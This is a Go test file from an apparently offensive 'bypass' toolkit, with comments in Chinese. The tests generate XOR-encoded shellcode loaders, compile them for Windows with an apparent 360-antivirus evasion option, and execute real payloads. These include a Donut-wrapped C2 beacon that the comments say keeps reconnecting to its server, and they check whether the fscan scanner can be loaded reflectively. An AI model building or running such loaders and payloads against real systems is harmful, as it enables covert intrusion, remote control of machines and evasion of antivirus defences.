package util

import (
	godonut "EasyTools/app/bypass/donut"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// findRepoFile 从当前工作目录向上查找仓库根目录下的指定文件（找不到返回空串）。
func findRepoFile(name string) string {
	dir, err := os.Getwd()
	if err != nil {
		return ""
	}
	for i := 0; i < 8; i++ {
		candidate := filepath.Join(dir, name)
		if _, err := os.Stat(candidate); err == nil {
			return candidate
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return ""
}

// findRepoGlob 在仓库根目录按前缀查找文件（如 fscan_*.exe）。
func findRepoGlob(pattern string) string {
	dir, err := os.Getwd()
	if err != nil {
		return ""
	}
	for i := 0; i < 8; i++ {
		matches, _ := filepath.Glob(filepath.Join(dir, pattern))
		if len(matches) > 0 {
			return matches[0]
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return ""
}

// buildAndRunPayload 用真实载荷走完整链：数据文件 → 生成源码 → 编译 → 运行。
// 返回进程与输出，便于调用方断言"载荷确实被执行"。
func buildAndRunPayload(t *testing.T, payload []byte, keepConsole bool, runFor time.Duration) (*exec.Cmd, string) {
	t.Helper()
	ensureGoModule(t)
	workDir := filepath.Join(os.TempDir(), "EasyTools", "file")
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeOneShotDataFiles(t, workDir, payload)

	loaderName := mustWindowsLoader(t)
	goFile, err := GenGoFile(loaderName, "一体", "xor", "否", "false", "false", "", "false", "", "", nil, nil)
	if err != nil || goFile == "" {
		t.Fatalf("生成源码失败: %v", err)
	}

	origCwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	outBase := t.TempDir()
	if err := os.Chdir(outBase); err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Chdir(origCwd) }()

	if berr := CheckGoBuild(goFile, "realpayload.exe", "360", "go", "一体", "", "", "x64", "windows", keepConsole); berr != nil {
		t.Fatalf("编译失败: %v", berr)
	}
	matches, _ := filepath.Glob(filepath.Join(outBase, "EasyToolsFiles", "file", "realpayload*.exe"))
	if len(matches) == 0 {
		t.Fatal("未生成产物")
	}
	bin := matches[0]
	st, _ := os.Stat(bin)
	t.Logf("产物: %s (%d 字节)", filepath.Base(bin), st.Size())

	cmd := exec.Command(bin)
	outFile := filepath.Join(outBase, "stdout.txt")
	f, ferr := os.Create(outFile)
	if ferr == nil {
		cmd.Stdout = f
		cmd.Stderr = f
	}
	if err := cmd.Start(); err != nil {
		t.Fatalf("启动产物失败: %v", err)
	}
	time.Sleep(runFor)
	if cmd.Process != nil {
		_ = cmd.Process.Kill()
	}
	_, _ = cmd.Process.Wait()
	if f != nil {
		_ = f.Close()
	}
	out, _ := os.ReadFile(outFile)
	return cmd, string(out)
}

// TestRealFscanPayloadState 记录并校验仓库 fscan 的加壳状态：
//   - 加壳版：上传层会明确拒绝（错误信息由 upload 给出），此处只断言识别正确；
//   - 脱壳版：进一步断言它有重定位目录（加壳版会被剥离），便于区分两者。
func TestRealFscanPayloadState(t *testing.T) {
	exePath := findRepoGlob("fscan*.exe")
	if exePath == "" {
		t.Skip("仓库根目录没有 fscan*.exe，跳过")
	}
	raw, err := os.ReadFile(exePath)
	if err != nil {
		t.Fatal(err)
	}
	packed, detail := PEPackInfo(raw)
	t.Logf("fscan: %s (%d 字节) packed=%v detail=%q", filepath.Base(exePath), len(raw), packed, detail)
	if packed {
		if !strings.Contains(strings.ToUpper(detail), "UPX") {
			t.Fatalf("加壳细节描述异常: %q", detail)
		}
		t.Logf("加壳版 fscan：上传阶段会被拒绝（加壳镜像无法反射加载）")
		return
	}
	// 脱壳版：应带重定位目录（UPX 加壳会剥离，导致 Donut 无法重定位）
	if size := relocDirSize(raw); size <= 0 {
		t.Fatalf("未加壳的 fscan 却没有重定位目录（size=%d），文件可能未完整脱壳", size)
	} else {
		t.Logf("脱壳版 fscan：重定位目录 %d 字节", size)
	}
}

// TestRealShellcodeBinExecutes easyshell stageless shellcode（原始 .bin）必须能被 loader 执行。
// 该 shellcode 是 Donut PIC 封装的 beacon，会持续重连 C2：loader 解码成功并跳入载荷后
// 进程会持续存活（若载荷未被执行，loader main 会立即返回、进程秒退）。
func TestRealShellcodeBinExecutes(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	binPath := findRepoGlob("*stageless*.bin")
	if binPath == "" {
		t.Skip("仓库根目录没有 *stageless*.bin，跳过真实 shellcode 验证")
	}
	raw, err := os.ReadFile(binPath)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("shellcode 载荷: %s (%d 字节)", filepath.Base(binPath), len(raw))

	cmd, out := buildAndRunPayload(t, raw, false, 8*time.Second)
	alive := cmd.ProcessState == nil
	if !alive {
		t.Fatalf("loader 进程已退出（exit=%v, out=%q），shellcode 未被成功执行", cmd.ProcessState, tail(out, 200))
	}
	if strings.Contains(out, "Exception 0x") || strings.Contains(out, "fatal error:") {
		t.Fatalf("loader 执行 shellcode 时崩溃:\n%s", tail(out, 400))
	}
	t.Logf("easyshell shellcode 已由 loader 成功执行（进程持续运行，载荷已接管执行流）✓")
}

// TestRealThirdPartyExeExecutes 真实第三方未加壳 EXE 经 loader 执行验证。
//
// 用仓库内自带的真实工具（SkyShadow 的 sigcheck64.exe）走完整链路：
// Donut 转换（带运行参数）→ 生成源码 → 编译(保留控制台) → 运行 →
// 断言该工具在 loader 进程内完成了自己的实际工作（写出结果文件）。
//
// 选它做参照的原因：
//   - 未加壳（含重定位表），与 UPX 加壳的 fscan 形成对照；
//   - 通过 -w <file> 把工作结果写到文件，证据不依赖控制台/stdout 捕获；
//   - 顺带覆盖 Donut 运行参数（模块的"运行参数"输入框）传递链路。
func TestRealThirdPartyExeExecutes(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	toolPath := findRepoFile(filepath.Join("app", "bypass", "skyshadow", "SkyShadowTools", "sigcheck64.exe"))
	if toolPath == "" {
		t.Skip("仓库内未找到 sigcheck64.exe")
	}
	raw, err := os.ReadFile(toolPath)
	if err != nil {
		t.Fatal(err)
	}
	if packed, detail := PEPackInfo(raw); packed {
		t.Skipf("sigcheck64.exe 被识别为加壳（%s），跳过", detail)
	}
	t.Logf("第三方工具: %s (%d 字节)", filepath.Base(toolPath), len(raw))

	target := filepath.Join(os.Getenv("SystemRoot"), "System32", "kernel32.dll")
	if _, err := os.Stat(target); err != nil {
		t.Skipf("参照目标不存在: %v", err)
	}
	resFile := filepath.Join(os.TempDir(), "easytools_sigcheck_result.txt")

	// 原生基线：确认参数与结果文件语义正确
	_ = os.Remove(resFile)
	nativeOut, nativeErr := exec.Command(toolPath, "-n", "-w", resFile, target).CombinedOutput()
	nativeBytes, _ := os.ReadFile(resFile)
	if len(nativeBytes) == 0 {
		t.Skipf("原生运行未产出结果文件，跳过（err=%v out=%q）", nativeErr, tail(string(nativeOut), 120))
	}
	t.Logf("原生基线结果文件 %d 字节: %q", len(nativeBytes), tail(string(nativeBytes), 80))
	nativeToken := strings.TrimSpace(string(nativeBytes))

	// 经 Donut 附带同样的运行参数
	runArgs := "-n -w " + resFile + " " + target
	pic, err := godonut.BuildPIC(raw, runArgs, "x64")
	if err != nil {
		t.Fatalf("Donut 转换失败: %v", err)
	}
	t.Logf("Donut PIC: %d 字节（已预置参数）", len(pic))

	_ = os.Remove(resFile)
	cmd, out := buildAndRunPayload(t, pic, true, 10*time.Second)
	if strings.Contains(out, "Exception 0x") || strings.Contains(out, "fatal error:") {
		t.Fatalf("loader 执行第三方 EXE 时崩溃:\n%s", tail(out, 400))
	}

	got, _ := os.ReadFile(resFile)
	_ = os.Remove(resFile)
	if len(got) == 0 {
		code := -1
		if cmd.ProcessState != nil {
			code = cmd.ProcessState.ExitCode()
		}
		t.Fatalf("loader 进程内未产出结果文件（exit=%d）：第三方 EXE 未被真正执行\n%s", code, tail(out, 300))
	}
	if nativeToken != "" && !strings.Contains(string(got), nativeToken) {
		t.Fatalf("结果文件内容与原生基线不一致:\n got=%q\nwant=%q", tail(string(got), 120), nativeToken)
	}
	t.Logf("第三方 EXE 已在 loader 进程内完成实际工作 ✓（结果文件 %d 字节，内容与原生一致）", len(got))
}

// tail 返回字符串末尾最多 n 个字符，便于日志展示。
func tail(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return "..." + s[len(s)-n:]
}
